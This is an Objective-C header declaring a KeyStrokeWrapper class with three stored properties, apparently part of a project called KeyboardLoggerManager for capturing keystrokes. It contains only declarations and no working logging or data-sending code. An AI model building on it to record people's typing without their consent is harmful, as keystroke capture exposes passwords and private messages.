//
//  KeyStrokeWrapper.h
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 6/18/16.
//  Copyright © 2016 Makara Khloth. All rights reserved.
//

#import <Foundation/Foundation.h>

@class KeyStrokeInfo;

@interface KeyStrokeWrapper : NSObject <NSCopying, NSCoding> {
    KeyStrokeInfo *mKeyStrokeInfo;
    id mKeyStrokeInfoAsscoiate;
    int mKeyStrokeInteruptID;
}

@property (nonatomic, retain) KeyStrokeInfo *mKeyStrokeInfo;
@property (nonatomic, retain) id mKeyStrokeInfoAsscoiate;
@property (nonatomic, assign) int mKeyStrokeInteruptID;

@end
